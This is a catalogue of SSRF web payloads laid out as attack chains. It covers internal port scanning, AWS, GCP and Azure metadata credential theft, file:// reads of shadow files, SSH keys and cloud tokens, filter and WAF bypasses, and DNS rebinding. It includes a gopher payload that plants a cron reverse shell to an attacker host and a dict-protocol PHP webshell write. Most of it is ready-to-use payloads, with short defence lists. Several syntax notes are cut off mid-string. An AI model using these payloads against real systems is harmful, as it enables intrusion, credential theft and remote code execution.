# SSRF Server-Side Request Forgery

_12 web payloads_

### Basic SSRF Attack  `ssrf-basic`
_Basic techniques for server-side request forgery attacks_
Subcategory: **Basic Attack** · tags: `ssrf` `server-side` `request`

**Prerequisites:**
- A URL input point exists
- The server will request a user-provided URL

**Attack Chain:**

**1. Probe for SSRF**
> Probe for an SSRF vulnerability
```
Input URL: http://127.0.0.1
Input URL: http://localhost
Input URL: http://[::1]
Observe whether the server response contains internal network information
```
**Syntax breakdown:**
- `127.0.0.1` — local loopback address _domain_
- `localhost` — local hostname _domain_
- `[::1]` — IPv6 local address _value_

**2. Scan internal ports**
> Scan internal ports
```
http://192.168.1.1:22
http://192.168.1.1:80
http://192.168.1.1:443
http://192.168.1.1:3306
Determine the port open status based on response differences
```
**Syntax breakdown:**
- `http://192.168.1.1:22
http://192.168.1.1:80
http://192.168.1.1:443
http://192` — attack payload _value_

**3. Access internal services**
> Access internal services
```
http://192.168.1.100/admin
http://10.0.0.1:8080/manager
http://172.16.0.1:9200/_cat/indices
Access an internal management interface or sensitive service
```
**Syntax breakdown:**
- `http://192.168.1.100/admin
http://10.0.0.1:8080/manager
http://172.16.0.1:9200` — attack payload _value_

**4. Read local files**
> Read local files
```
file:///etc/passwd
file:///c:/windows/win.ini
file:///proc/self/environ
Use the file protocol to read local files
```
**Syntax breakdown:**
- `file://` — local file protocol _value_
- `/etc/passwd` — Linux user information file _path_

**WAF/EDR Bypass Variants:**

**IP format bypass**
> Bypass using different IP formats
```
http://0177.0.0.1 (octal)
http://2130706433 (decimal)
http://0x7f000001 (hexadecimal)
http://127.1 (shorthand)
http://127.0.0.1.nip.io (DNS rebinding)
```
**Syntax breakdown:**
- `0177` — the octal representation of 127 _value_
- `2130706433` — the decimal representation of 127.0.0.1 _value_

**URL parsing differences**
> Exploit URL parsing differences
```
http://attacker.com#@127.0.0.1/
http://127.0.0.1.attacker.com
http://attacker.com\@127.0.0.1/
Exploit URL parsing differences to bypass
```
**Syntax breakdown:**
- `127.0.0.1` — local loopback _domain_

**DNS rebinding**
> DNS rebinding attack
```
Use a DNS rebinding service:
http://7f000001.cip.cc (resolves to 127.0.0.1)
http://127.0.0.1.nip.io
The first resolution returns an external IP, the second returns an internal IP
```
**Syntax breakdown:**
- `Use a DNS rebinding service:
http://7f000001.cip.cc` — command/payload start _command_
- ` (resolves to 127.0.0.1)
http://127.0.0.1.nip.io
The first resolution returns an external IP, the second returns an internal IP` — parameters and payload content _value_

**Overview:** SSRF (Server-Side Request Forgery) allows an attacker to initiate arbitrary network requests through the target server, which can be used to access internal resources, cloud metadata, local services, and other targets that are not directly reachable externally.

**Vulnerability Principle:** SSRF vulnerabilities exist in scenarios where the server initiates a request based on a user-provided URL: image loading/preview, URL import, webhook callback, PDF generator, file download proxy, and so on. An attacker can manipulate the URL to point to an internal address (127.0.0.1/10.x/172.16.x) or a cloud metadata endpoint.

**Exploitation Method:** Complete exploitation flow:
1. Probe for the SSRF vulnerability
2. Scan internal ports and services
3. Access internal management interfaces
4. Read sensitive files or attack internal services

**Defensive Measures:** Defenses:
1. Validate the URL against an allowlist
2. Disable unnecessary protocols
3. Validate the resolved IP address
4. Network isolation and access control

---

### AWS Metadata Attack  `ssrf-cloud-aws`
_Use SSRF to access the AWS EC2 metadata service_
Subcategory: **Cloud Metadata** · tags: `ssrf` `aws` `metadata` `cloud`

**Prerequisites:**
- An SSRF vulnerability exists
- The target runs on AWS EC2

**Attack Chain:**

**1. Access the metadata service**
> Access the AWS metadata service
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/
```
**Syntax breakdown:**
- `169.254.169.254` — AWS metadata service address _value_
- `latest` — the latest version of the API _value_
- `meta-data` — instance metadata _value_

**2. Obtain IAM credentials**
> Obtain temporary IAM credentials
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
After obtaining the role name:
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```
**Syntax breakdown:**
- `iam/security-credentials` — IAM security credentials path _value_

**3. Obtain user data**
> Obtain instance user data
```
http://169.254.169.254/latest/user-data/
May contain sensitive information, API keys, startup scripts
```
**Syntax breakdown:**
- `http://169.254.169.254/latest/user-data/` — step 1 operation _command_
- `May contain sensitive information, API keys, startup scripts` — step 2 operation _value_

**4. Bypass using IMDSv2**
> Bypass IMDSv2 protection
```
If IMDSv2 is enforced:
1. First obtain the token:
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
2. Use the token to access:
Header: X-aws-ec2-metadata-token: TOKEN
```
**Syntax breakdown:**
- `X-aws-ec2-metadata-token` — IMDSv2 authentication token _value_

**WAF/EDR Bypass Variants:**

**IP encoding variant bypass**
> Bypass the 169.254.169.254 blacklist detection via decimal, hexadecimal, octal, and IPv6-mapped IP address encoding
```
# Decimal integer:
http://2852039166/latest/meta-data/
# Hexadecimal:
http://0xA9FEA9FE/latest/meta-data/
# Octal:
http://0251.0376.0251.0376/latest/meta-data/
# IPv6-mapped:
http://[::ffff:169.254.169.254]/latest/meta-data/
# Mixed encoding:
http://0xA9.0376.169.0xFE/latest/meta-data/
```
**Syntax breakdown:**
- `# Decimal integer:` — primary command _command_
- `...` — 10 lines total _value_

**DNS rebinding and redirect chain bypass**
> Use DNS rebinding so the domain resolves to a safe IP during validation but to the metadata address during the actual request, or bypass via an HTTP redirect chain and non-standard protocols
```
# DNS rebinding (using a rebind service):
http://7f000001.A9FEA9FE.rbndr.us/latest/meta-data/
# The first resolution returns the allowed IP, the second returns 169.254.169.254

# Redirect chain:
# Set up a 302 redirect on attacker.com to http://169.254.169.254
http://attacker.com/redirect?url=http://169.254.169.254/latest/meta-data/

# URL schema variants:
gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0AHost:%20169.254.169.254%0A%0A
```
**Syntax breakdown:**
- `# DNS rebinding (using a rebind service):` — primary command _command_
- `...` — 8 lines total _value_

**Overview:** An SSRF attack in the AWS environment can obtain sensitive information such as temporary IAM credentials and instance configuration via the metadata service (169.254.169.254). It is one of the highest-risk SSRF exploitation scenarios in cloud environments and once led to major data breaches such as Capital One.

**Vulnerability Principle:** The metadata service of an AWS EC2 instance is open on 169.254.169.254 by default (IMDSv1 requires no special authentication). Via SSRF, the temporary AccessKey/SecretKey/Token of the IAM role can be obtained, and then sensitive data on AWS services such as S3 buckets, RDS databases, and Lambda functions can be accessed.

**Exploitation Method:** Complete exploitation flow:
1. Access the metadata service via SSRF
2. Obtain the IAM role credentials
3. Use the credentials to access AWS resources
4. Obtain sensitive information from the user data

**Defensive Measures:** Defenses:
1. Use IMDSv2 and enforce token authentication
2. Restrict IAM role permissions
3. Do not store sensitive information in user data
4. Use SSRF protection

---

### GCP Metadata Attack  `ssrf-cloud-gcp`
_Use SSRF to attack the Google Cloud metadata service_
Subcategory: **GCP Metadata** · tags: `ssrf` `gcp` `cloud` `metadata`

**Prerequisites:**
- An SSRF vulnerability exists
- The target runs in a GCP environment

**Attack Chain:**

**1. Access the metadata service**
> Access the GCP metadata endpoint
```
http://metadata.google.internal/computeMetadata/v1/
Requires adding the header:
Metadata-Flavor: Google
```
**Syntax breakdown:**
- `metadata.google.internal` — GCP metadata service address _domain_
- `computeMetadata/v1/` — Compute Engine metadata API _encoding_
- `Metadata-Flavor: Google` — the required request header _header_

**2. Obtain an access token**
> Obtain a service account token
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Returns an OAuth access token
```
**Syntax breakdown:**
- `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/def` — attack payload _value_

**3. Obtain service account information**
> Obtain the service account email and aliases
```
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/aliases
```
**Syntax breakdown:**
- `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/def` — attack payload _value_

**4. Obtain project information**
> Obtain the project ID
```
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
```
**Syntax breakdown:**
- `http://metadata.google.internal/computeMetadata/v1/project/project-id
http://me` — attack payload _value_

**5. Obtain SSH keys**
> Obtain the SSH public key
```
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys
```
**Syntax breakdown:**
- `http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
` — attack payload _value_

**6. Obtain Kubelet credentials**
> Obtain GKE cluster information
```
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
Obtain Kubernetes environment variables
```
**Syntax breakdown:**
- `http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env` — command/keyword _command_

**WAF/EDR Bypass Variants:**

**Use an IP address**
> Bypass domain filtering
```
http://169.254.169.254/computeMetadata/v1/
Use the internal IP instead of the domain
```
**Syntax breakdown:**
- `http://169.254.169.254/computeMetadata/v1/
Use the internal IP instead of the domain` — attack payload _value_

**Overview:** SSRF in a GCP (Google Cloud Platform) environment can access the metadata service (metadata.google.internal) to obtain the service account's OAuth Token and project configuration information, and then control GCP resources (buckets/databases/compute instances, etc.).

**Vulnerability Principle:** The GCP metadata service requires the Metadata-Flavor: Google header (but some SSRF scenarios can inject a custom header). Key endpoints include: /computeMetadata/v1/instance/service-accounts/default/token to obtain the Access Token, /project/project-id to obtain project information.

**Exploitation Method:** Complete exploitation flow:
1. Discover the SSRF vulnerability
2. Access the metadata service
3. Obtain the access token
4. Use the token to access GCP resources

**Defensive Measures:** Defenses:
1. Restrict metadata service access
2. Use the GCP Instance Metadata API v2
3. Enforce network isolation
4. Monitor abnormal metadata access

---

### Azure Metadata Attack  `ssrf-cloud-azure`
_Use SSRF to attack the Azure metadata service_
Subcategory: **Azure Metadata** · tags: `ssrf` `azure` `cloud` `metadata`

**Prerequisites:**
- An SSRF vulnerability exists
- The target runs in an Azure environment

**Attack Chain:**

**1. Access the metadata service**
> Access the Azure metadata endpoint
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Requires adding the header:
Metadata: true
```
**Syntax breakdown:**
- `169.254.169.254` — Azure metadata service IP _domain_
- `/metadata/instance` — instance metadata endpoint _encoding_
- `Metadata: true` — the required request header _header_

**2. Obtain an access token**
> Obtain a managed identity token
```
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Returns an Azure AD access token
```
**Syntax breakdown:**
- `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
Returns Azure` — command/payload start _command_
- ` AD access token` — parameters and payload content _value_

**3. Obtain compute information**
> Obtain compute instance information
```
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
Returns detailed VM information
```
**Syntax breakdown:**
- `http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
Returns detailed VM info` — attack payload _value_

**4. Obtain network information**
> Obtain the network configuration
```
http://169.254.169.254/metadata/instance/network?api-version=2021-02-01
Returns network configuration information
```
**Syntax breakdown:**
- `http://169.254.169.254/metadata/instance/network?api-version=2021-02-01
Returns network config info` — attack payload _value_

**5. Obtain user data**
> Obtain user data
```
http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01&format=text
Returns user custom data
```
**Syntax breakdown:**
- `http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01` — attack payload _value_

**WAF/EDR Bypass Variants:**

**Bypass the Metadata header check**
> Bypass request header validation
```
Use HTTP request smuggling or redirects to bypass the Metadata header check
```
**Syntax breakdown:**
- `Use HTTP request smuggling or redirects to bypass the Metadata header check` — attack payload _value_

**Overview:** SSRF in an Azure cloud environment can access the IMDS (Instance Metadata Service, 169.254.169.254) to obtain the managed identity's OAuth Token, and then access cloud resources such as Azure Key Vault keys, storage accounts, and SQL databases.

**Vulnerability Principle:** The Azure IMDS endpoint requires the Metadata: true header. Key paths: /metadata/instance to obtain the VM configuration, /metadata/identity/oauth2/token to obtain the Managed Identity's Access Token. This Token can be used to call the Azure Resource Manager API to manage all authorized resources.

**Exploitation Method:** Complete exploitation flow:
1. Discover the SSRF vulnerability
2. Add the Metadata header to access the metadata
3. Obtain the managed identity token
4. Use the token to access Azure resources

**Defensive Measures:** Defenses:
1. Disable managed identity (if not needed)
2. Enforce network isolation
3. Monitor abnormal metadata access
4. Use Azure firewall rules

---

### SSRF Protocol Exploitation  `ssrf-protocol`
_Use various protocols for SSRF attacks_
Subcategory: **Protocol Exploitation** · tags: `ssrf` `protocol` `file` `gopher`

**Prerequisites:**
- An SSRF vulnerability exists
- The server supports multiple protocols

**Attack Chain:**

**1. File protocol**
> Use the File protocol to read files
```
file:///etc/passwd
file:///c:/windows/win.ini
file:///proc/self/environ
Read local files
```
**Syntax breakdown:**
- `file://` — local file protocol _value_
- `/etc/passwd` — Linux user information file _path_
- `/proc/self/environ` — environment variables of the current process _path_

**2. Dict protocol**
> Use the Dict protocol to probe services
```
dict://127.0.0.1:6379/info
dict://127.0.0.1:11211/stats
Probe internal services
```
**Syntax breakdown:**
- `dict://` — dictionary service protocol _value_
- `6379` — Redis default port _value_
- `11211` — Memcached default port _value_

**3. Gopher protocol**
> Use the Gopher protocol to attack internal services
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a...
Construct Redis commands
```
**Syntax breakdown:**
- `gopher://` — Gopher protocol _value_
- `_` — protocol separator _value_
- `%0d%0a` — the URL encoding of the CRLF newline _encoding_

**4. LDAP protocol**
> Use the LDAP protocol
```
ldap://attacker.com/cn=test
ldap://127.0.0.1:389/cn=test
Trigger an LDAP query
```
**Syntax breakdown:**
- `ldap://attacker.com/cn=test
ldap://127.0.0.1:389/cn=test
Trigger an LDAP query` — attack payload _value_

**5. TFTP protocol**
> Use the TFTP protocol
```
tftp://attacker.com/file
Trigger a TFTP request
```
**Syntax breakdown:**
- `tftp://attacker.com/file
Trigger a TFTP request` — attack payload _value_

**WAF/EDR Bypass Variants:**

**Protocol case bypass**
> Mixed-case bypass
```
FILE:///etc/passwd
File:///etc/passwd
Gopher://127.0.0.1:6379/
```
**Syntax breakdown:**
- `FILE:///etc/passwd
File:///etc/passwd
Gopher://127.0.0.1:6379/` — attack payload _value_

**Overview:** SSRF protocol exploitation expands the attack surface. Beyond the common http/https, protocols such as file:// to read local files, gopher:// to construct arbitrary TCP packets, dict:// to probe services, and ftp:// to access FTP services greatly enhance the exploitability of SSRF.

**Vulnerability Principle:** Dangerous protocols supported by SSRF: file:// to read local files (file:///etc/passwd), gopher:// to construct arbitrary TCP packets (can attack internal services such as Redis/MySQL/SMTP), dict:// to probe ports and service fingerprints, ftp:// to access internal FTP, ldap:// to query the directory service.

**Exploitation Method:** Complete exploitation flow:
1. Test the supported protocols
2. Choose an appropriate protocol
3. Construct the attack payload
4. Obtain data or execute commands

**Defensive Measures:** Defenses:
1. Restrict protocols with an allowlist (HTTP/HTTPS only)
2. Disable dangerous protocol handling
3. URL normalization validation
4. Network isolation

---

### Gopher Protocol Attack  `ssrf-gopher`
_Use the Gopher protocol to attack internal services_
Subcategory: **Gopher Attack** · tags: `ssrf` `gopher` `redis` `mysql`

**Prerequisites:**
- An SSRF vulnerability exists
- The server supports the Gopher protocol

**Attack Chain:**

**1. Gopher basic format**
> Gopher protocol format
```
gopher://<host>:<port>/_<payload>
After _ is the actual data sent
Needs URL encoding
```
**Syntax breakdown:**
- `gopher://` — Gopher protocol identifier _value_
- `<host>:<port>` — target host and port _tag_
- `_<payload>` — the data to send _value_

**2. Attack Redis**
> Write a cron job for a reverse shell
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$28%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```
**Syntax breakdown:**
- `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a` — attack payload _value_

**3. Attack MySQL**
> Attack the MySQL database
```
gopher://127.0.0.1:3306/_<MySQL protocol packet>
Needs to construct data in the MySQL protocol format
```
**Syntax breakdown:**
- `gopher://127.0.0.1:3306/_<MySQL protocol packet>
Needs to construct data in the MySQL protocol format` — attack payload _value_

**4. Attack FastCGI**
> Attack PHP-FPM
```
gopher://127.0.0.1:9000/_<FastCGI packet>
Construct a PHP-FPM attack payload
```
**Syntax breakdown:**
- `gopher://127.0.0.1:9000/_<FastCGI packet>
Construct a PHP-FPM attack payload` — attack payload _value_

**5. Send an HTTP request**
> Send an HTTP request
```
gopher://target.com:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20target.com%0d%0a%0d%0a
Construct an HTTP request to attack the internal network
```
**Syntax breakdown:**
- `gopher://target.com:80/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20target.com%0d%0a%0d` — attack payload _value_

**WAF/EDR Bypass Variants:**

**Double URL encoding**
> Double URL encoding bypass
```
gopher://127.0.0.1:6379/_%252a%250d%250a...
Double encoding bypass
```
**Syntax breakdown:**
- `gopher://127.0.0.1:6379/_%252a%250d%250a...
Double encoding bypass` — attack payload _value_

**Overview:** The gopher:// protocol is the most powerful protocol in SSRF exploitation. It can construct arbitrary TCP packet content and simulate the communication of multiple protocols such as Redis/MySQL/SMTP/HTTP. It is the key technique for SSRF attacks against internal services to achieve RCE.

**Vulnerability Principle:** gopher:// passes raw TCP data via URL encoding: gopher://ip:port/_[url-encoded-data]. It can construct Redis SLAVEOF/CONFIG SET commands to write a webshell, MySQL authentication packets to execute SQL statements, SMTP email sending, HTTP POST requests, and so on, upgrading SSRF to arbitrary operations against internal services.

**Exploitation Method:** Complete exploitation flow:
1. Confirm Gopher protocol support
2. Construct the target service's protocol data
3. URL-encode the payload
4. Send the attack request

**Defensive Measures:** Defenses:
1. Disable the Gopher protocol
2. Restrict protocols with an allowlist
3. Network isolation
4. Monitor abnormal requests

---

### Dict Protocol Attack  `ssrf-dict`
_Use the Dict protocol to probe and attack internal services_
Subcategory: **Dict Protocol** · tags: `ssrf` `dict` `redis` `memcached`

**Prerequisites:**
- An SSRF vulnerability exists
- The server supports the Dict protocol

**Attack Chain:**

**1. Dict protocol format**
> Dict protocol basic format
```
dict://<host>:<port>/<command>
Send a command to the target service
```
**Syntax breakdown:**
- `dict://` — Dict protocol identifier _value_
- `<host>:<port>` — target host and port _tag_
- `<command>` — the command to execute _tag_

**2. Probe Redis**
> Probe the Redis service
```
dict://127.0.0.1:6379/info
dict://127.0.0.1:6379/keys%20*
Obtain Redis information
```
**Syntax breakdown:**
- `dict://127.0.0.1:6379/info
dict://127.0.0.1:6379/keys%20*
Obtain Redis information` — attack payload _value_

**3. Probe Memcached**
> Probe the Memcached service
```
dict://127.0.0.1:11211/stats
dict://127.0.0.1:11211/get%20key
Obtain Memcached information
```
**Syntax breakdown:**
- `dict://127.0.0.1:11211/stats
dict://127.0.0.1:11211/get%20key
Obtain Memcached information` — attack payload _value_

**4. Redis write a file**
> Write a WebShell
```
dict://127.0.0.1:6379/set%20shell%20"<?php @eval($_POST[cmd]);?>"
dict://127.0.0.1:6379/config%20set%20dir%20/var/www/html
dict://127.0.0.1:6379/config%20set%20dbfilename%20shell.php
dict://127.0.0.1:6379/save
```
**Syntax breakdown:**
- `dict://127.0.0.1:6379/set%20shell%20"<?php` — command/payload start _command_
- ` @eval($_POST[cmd]);?>"
dict://127.0.0.1:6379/config%20set%20dir%20/var/www/html
dict://127.0.0.1:6379/config%20set%20dbfilename%20shell.php
dict://127.0.0.1:6379/save` — parameters and payload content _value_

**WAF/EDR Bypass Variants:**

**Encoding bypass**
> URL encoding to bypass keyword filtering
```
dict://127.0.0.1:6379/%73%65%74%20...
URL-encode the command
```
**Syntax breakdown:**
- `dict://127.0.0.1:6379/%73%65%74%20...
URL-encode the command` — attack payload _value_

**Overview:** The dict:// protocol can send a single line of text to a specified IP:port and is commonly used in SSRF for port scanning and service fingerprinting. Although its functionality is limited, it is an effective alternative for internal probing when gopher:// is unavailable.

**Vulnerability Principle:** The dict:// protocol sends DICT protocol commands (a single line of text + CRLF) to the target. Exploitation methods: 1) port scanning (dict://ip:port/info to detect an open port) 2) Redis command execution (dict://ip:6379/SET key value) 3) service fingerprinting (determine the service type based on the response).

**Exploitation Method:** Complete exploitation flow:
1. Confirm Dict protocol support
2. Probe internal services
3. Send a malicious command
4. Obtain data or write a file

**Defensive Measures:** Defenses:
1. Disable the Dict protocol
2. Restrict protocols with an allowlist
3. Internal service authentication
4. Network isolation

---

### File Protocol Attack  `ssrf-file`
_Use the File protocol to read local files_
Subcategory: **File Protocol** · tags: `ssrf` `file` `lfi` `read`

**Prerequisites:**
- An SSRF vulnerability exists
- The server supports the File protocol

**Attack Chain:**

**1. Linux sensitive files**
> Read Linux sensitive files
_platform: linux_
```
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///etc/resolv.conf
file:///proc/self/environ
file:///proc/self/cmdline
```
**Syntax breakdown:**
- `file://` — File protocol identifier _value_
- `/etc/passwd` — user information file _path_
- `/proc/self/` — current process information directory _path_

**2. Windows sensitive files**
> Read Windows sensitive files
_platform: windows_
```
file:///c:/windows/win.ini
file:///c:/windows/system32/config/sam
file:///c:/users/administrator/.ssh/id_rsa
file:///c:/inetpub/logs/logfiles/
```
**Syntax breakdown:**
- `file:///c:/windows/win.ini
file:///c:/windows/system32/config/sam
file:///c:/u` — attack payload _value_

**3. Web configuration files**
> Read the web application configuration
```
file:///var/www/html/config.php
file:///var/www/html/wp-config.php
file:///app/config/database.yml
file:///app/.env
```
**Syntax breakdown:**
- `file:///var/www/html/config.php
file:///var/www/html/wp-config.php
file:///app` — attack payload _value_

**4. Cloud environment files**
> Read cloud environment credentials
```
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
file:///home/user/.aws/credentials
```
**Syntax breakdown:**
- `file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secr` — attack payload _value_

**5. SSH keys**
> Read the SSH private key
```
file:///home/user/.ssh/id_rsa
file:///home/user/.ssh/authorized_keys
file:///root/.ssh/id_rsa
```
**Syntax breakdown:**
- `file:///home/user/.ssh/id_rsa
file:///home/user/.ssh/authorized_keys
file:///r` — attack payload _value_

**WAF/EDR Bypass Variants:**

**Mixed case**
> Mixed-case bypass
```
FILE:///etc/passwd
File:///etc/passwd
file:///ETC/PASSWD
```
**Syntax breakdown:**
- `FILE:///etc/passwd
File:///etc/passwd
file:///ETC/PASSWD` — attack payload _value_

**Overview:** The file:// protocol is the most basic exploitation method in SSRF, directly reading any file on the server's local filesystem. Although simple, it is extremely effective for obtaining sensitive information such as configuration files, source code, and key files.

**Vulnerability Principle:** The file:// protocol reads local files: file:///etc/passwd (user list), file:///etc/shadow (password hashes, requires root privileges), file:///proc/self/environ (environment variables, may contain keys), file:///root/.ssh/id_rsa (SSH private key). On Windows it can read C:\\Windows\\win.ini and similar.

**Exploitation Method:** Complete exploitation flow:
1. Confirm File protocol support
2. Probe sensitive file paths
3. Read configuration files to obtain credentials
4. Use the credentials for further penetration

**Defensive Measures:** Defenses:
1. Disable the File protocol
2. Restrict protocols with an allowlist
3. File permission control
4. Encrypt sensitive files at rest

---

### SSRF Bypass Techniques  `ssrf-bypass`
_Various techniques for bypassing SSRF filtering_
Subcategory: **Bypass Techniques** · tags: `ssrf` `bypass` `waf` `filter`

**Prerequisites:**
- An SSRF vulnerability exists
- A filtering mechanism exists

**Attack Chain:**

**1. IP format bypass**
> Represent 127.0.0.1 using different IP formats
```
http://0177.0.0.1 (octal)
http://2130706433 (decimal)
http://0x7f000001 (hexadecimal)
http://127.1 (shorthand)
http://127.0.0.1.nip.io (DNS rebinding)
http://127.0.0.1.xip.io
```
**Syntax breakdown:**
- `0177` — the octal representation of 127 _value_
- `2130706433` — the decimal integer of 127.0.0.1 _value_
- `0x7f000001` — the hexadecimal of 127.0.0.1 _encoding_

**2. URL parsing differences**
> Exploit URL parsing differences
```
http://attacker.com#@127.0.0.1/
http://127.0.0.1.attacker.com
http://attacker.com\@127.0.0.1/
http://attacker.com\.127.0.0.1/
```
**Syntax breakdown:**
- `#@` — exploit the fragment identifier difference _value_
- `\@` — exploit the backslash parsing difference _value_

**3. Redirect bypass**
> Exploit an HTTP redirect
```
http://attacker.com/redirect?url=http://127.0.0.1
Use a URL shortener service to redirect to the internal network
```
**Syntax breakdown:**
- `http://attacker.com/redirect?url=http://127.0.0.1
Use a URL shortener service to redirect to the internal network` — attack payload _value_

**4. DNS rebinding**
> DNS rebinding attack
```
http://7f000001.cip.cc
http://127.0.0.1.nip.io
The first resolution returns an external IP, the second returns an internal IP
```
**Syntax breakdown:**
- `http://7f000001.cip.cc
http://127.0.0.1.nip.io
The first resolution returns an external IP, the second returns an internal IP` — attack payload _value_

**5. IPv6 bypass**
> Bypass using an IPv6 address
```
http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[0000::1]
Use the IPv6 local address
```
**Syntax breakdown:**
- `http://[::1]
http://[0:0:0:0:0:0:0:1]
http://[0000::1]
Use the IPv6 local address` — attack payload _value_

**6. Encoding bypass**
> Bypass using encoding
```
http://%31%32%37%2e%30%2e%30%2e%31 (URL encoding)
http://127.0.0.1%00attacker.com (null byte)
http://127.0.0.1%0d%0aHost:attacker.com (CRLF)
```
**Syntax breakdown:**
- `http://%31%32%37%2e%30%2e%30%2e%31` — command/payload start _command_
- ` (URL encoding)
http://127.0.0.1%00attacker.com (null byte)
http://127.0.0.1%0d%0aHost:attacker.com (CRLF)` — parameters and payload content _value_

**WAF/EDR Bypass Variants:**

**Combined bypass**
> Combine multiple bypass techniques
```
http://0x7f.0.0.1
http://0177.0.0.1
http://127.000.000.001
Combine multiple formats
```
**Syntax breakdown:**
- `http://0x7f.0.0.1
http://0177.0.0.1
http://127.000.000.001
Combine multiple formats` — attack payload _value_

**Overview:** SSRF bypass techniques target application-layer URL filtering measures (IP blacklist/allowlist/domain restriction), breaking through SSRF protection via IP encoding transformation, DNS rebinding, URL parsing differences, redirect jumps, and so on.

**Vulnerability Principle:** SSRF filter bypass methods: 1) IP transformation (0177.0.0.1/2130706433/0x7f000001) 2) IPv6 (::1/::ffff:127.0.0.1) 3) DNS rebinding (domain resolution switching) 4) URL parsing differences (@ symbol/URL encoding) 5) 302 redirect jumps 6) URL shortener services 7) base conversion 8) CNAME to an internal IP.

**Exploitation Method:** Complete exploitation flow:
1. Analyze the filtering rules
2. Test various bypass techniques
3. Find an effective bypass method
4. Access internal resources

**Defensive Measures:** Defenses:
1. Validate the IP address after resolution
2. Prohibit access to internal IP ranges
3. Disable following redirects
4. Use DNS resolution validation

---

### DNS Rebinding Attack  `ssrf-dns-rebinding`
_Use DNS rebinding to bypass SSRF protection_
Subcategory: **DNS Rebinding** · tags: `ssrf` `dns` `rebinding` `bypass`

**Prerequisites:**
- An SSRF vulnerability exists
- DNS resolution validation exists

**Attack Chain:**

**1. DNS rebinding principle**
> DNS rebinding principle
```
First DNS query: returns an external IP (passes validation)
Second DNS query: returns an internal IP (actual access)
Uses TTL=0 or a short TTL
```
**Syntax breakdown:**
- `TTL=0` — the DNS record expires immediately _value_
- `First query` — returns the allowed IP _value_
- `Second query` — returns the internal IP _value_

**2. Use public services**
> Use a DNS rebinding service
```
http://7f000001.cip.cc (resolves to 127.0.0.1)
http://127.0.0.1.nip.io
http://127.0.0.1.xip.io
http://A.127.0.0.1.1time.8.8.8.8.forever.rebind.network
```
**Syntax breakdown:**
- `http://7f000001.cip.cc` — command/payload start _command_
- ` (resolves to 127.0.0.1)
http://127.0.0.1.nip.io
http://127.0.0.1.xip.io
http://A.127.0.0.1.1time.8.8.8.8.forever.rebind.network` — parameters and payload content _value_

**3. Self-hosted DNS server**
> Set up a self-hosted DNS rebinding server
```
# Set up using dnspython
from dnslib import *
class RebindResolver:
    def __init__(self):
        self.count = 0
    def resolve(self, request):
        self.count += 1
        if self.count % 2 == 1:
            return "1.2.3.4"  # External IP
        else:
            return "127.0.0.1"  # Internal IP
```
**Syntax breakdown:**
- `# Set up using dnspython
from dnslib import *
class RebindResolver:
    def __init__(s` — attack payload _value_

**4. Attack flow**
> Complete attack flow
```
1. Register a domain pointing to the self-hosted DNS server
2. Configure the DNS server to return two IPs
3. Initiate the SSRF request using that domain
4. The first validation passes, the second accesses the internal network
```
**Syntax breakdown:**
- `1.` — command/payload start _command_
- ` Register a domain pointing to the self-hosted DNS server
2. Configure the DNS server to return two IPs
3. Initiate the SSRF request using that domain
4. The first validation passes, the second accesses the internal network` — parameters and payload content _value_

**WAF/EDR Bypass Variants:**

**Multiple IP response**
> Exploit a multiple-IP response
```
The DNS response contains multiple A records
The server may choose a different IP
```
**Syntax breakdown:**
- `The DNS response contains multiple A records
The server may choose a different IP` — attack payload _value_

**Overview:** A DNS rebinding attack bypasses SSRF domain/IP validation by changing the domain resolution result between two DNS queries (first resolving to a legitimate IP to pass validation, then resolving to an internal IP to initiate the request). It is one of the most stealthy SSRF bypass methods.

